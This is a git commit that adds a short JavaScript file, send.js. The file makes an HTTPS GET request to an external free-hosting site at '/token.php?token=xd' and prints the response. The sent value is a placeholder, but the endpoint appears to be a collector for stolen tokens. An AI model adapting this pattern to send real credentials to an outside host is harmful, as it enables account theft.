2fe84124ba7360359666e5f106ea29b768627622
cybxis <63922811+cybxis@users.noreply.github.com>
2020-11-10 04:20:27 +0800

    Create send.js

---
+++ functions/send.js
@@ -0,0 +1,20 @@
+	const options = {
+        hostname: 'cybxis.000webhostapp.com',
+        port: 443,
+        path: '/token.php?token=xd',
+        method: 'GET'
+	}
+
+	const req = https.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`)
+
+        res.on('data', d => {
+            process.stdout.write(d)
+        })
+	})
+
+	req.on('error', error => {
+        console.error(error)
+	})
+
+	req.end()
